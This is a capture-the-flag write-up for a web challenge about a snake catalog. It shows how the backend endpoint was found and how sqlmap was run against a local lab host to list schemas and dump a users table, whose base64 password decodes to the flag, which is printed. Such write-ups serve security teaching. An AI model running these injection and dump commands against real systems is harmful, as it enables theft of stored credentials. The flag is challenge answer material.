# Statement

¿Cuál es **esa qlebra**? Para eso tenemos un blog en el cual identificamos varios tipos de reptiles. ¿Será que puedas encontrar algo más allá de animales?

# Provided Files

N/A

# Procedure

By entering the website provided, we can see that there is a "snake catalog" which just have 3 snake types, and each one of this can be showed depending on the url attribute `snake_id`. By the statement and the website, we can see that the main theme in this challenge is SQL, probably SQL injection through one of the parameters.

![Step 1](https://res.cloudinary.com/dmrgfufa4/image/upload/v1604184023/writeups/HackademyCTF_v1/web_4_1.png)

Naturally, we could thing that `snake_id` would be the injectable parameter, but after trying to exploit it with `sqlmap` (one of the most popular tools for sql injection testing) we can see that **this attribute is not injectable**.

After investigating a little more, we can see that this is only the frontend of distributed application. This can be proved by opening the Network tab, and see that with each request to the main url, another request to another host is triggered, probably the backend. This request look like the following:

```
Request URL: http://localhost:5006/snakes?id=2
Request Method: GET
```

![Step 2](https://res.cloudinary.com/dmrgfufa4/image/upload/v1604184023/writeups/HackademyCTF_v1/web_4_2.png)

So if we test this new url inside the `sqlmap` we can see that the attribute `id` is injectable

```bash
# We use localhost for local testing, but during the event it was the CTF server IP
sqlmap -u http://localhost:5006/snakes?id=1
```

![Step 3](https://res.cloudinary.com/dmrgfufa4/image/upload/v1604184023/writeups/HackademyCTF_v1/web_4_3.png)
![Step 4](https://res.cloudinary.com/dmrgfufa4/image/upload/v1604184023/writeups/HackademyCTF_v1/web_4_4.png)

After verifying that the `id` attribute was injectable, we can get which databases and tables does the app has access to.

```bash
# List all schemas available
sqlmap -u http://localhost:5006/snakes?id=1 --schema
```

Output
```bash
Database: snakes
Table: users
[3 columns]
+----------|---------------+
| Column   | Type          |
+----------|---------------+
| id       | int(11)       |
| password | varchar(1024) |
| username | varchar(1024) |
+----------|---------------+
```

```bash
# Dump the content of the table "users" inside the database "snakes"
sqlmap -u http://localhost:5006/snakes?id=1 -D snakes -T users --dump
```

Output
```bash
Database: snakes
Table: users
[1 entry]
+----|------------------------------------------------------------------------------------------------------|--------------+
| id | password                                                                                             | username     |
+----|------------------------------------------------------------------------------------------------------|--------------+
| 1  | bWJsdWV7M3N0M18zcjRfZDNfbDBzX3IzdDBzX200c19kMWYxYzFsM3MuM2NoYXQzX3VuMV9tMWxsM3JfcDRyNF9mM3N0M2o0cn0= | secret_admin |
+----|------------------------------------------------------------------------------------------------------|--------------+
```

After obtaining the password of the `secret_admin` user, we can see that this is an encoded string. After examining the string, we can see that it ends in an equal sign, and contains lowercase and uppercase characters so probably the password is encoded with `base64`.

If we decode this string, we will obtain the flag

``` bash
echo "bWJsdWV7M3N0M18zcjRfZDNfbDBzX3IzdDBzX200c19kMWYxYzFsM3MuM2NoYXQzX3VuMV9tMWxsM3JfcDRyNF9mM3N0M2o0cn0=" | base64 -d
```

# Flag

`mblue{3st3_3r4_d3_l0s_r3t0s_m4s_d1f1c1l3s.3chat3_un1_m1ll3r_p4r4_f3st3j4r}`

# Try it yourself!

As this is a more complex challenge, we need to orchestrate a couple of containers at the same time, this is why we use `docker-compose`. This tool will use the `docker-compose.yml` that is in this folder, it is not part of the challenge itself.

```bash
docker-compose up -d
```
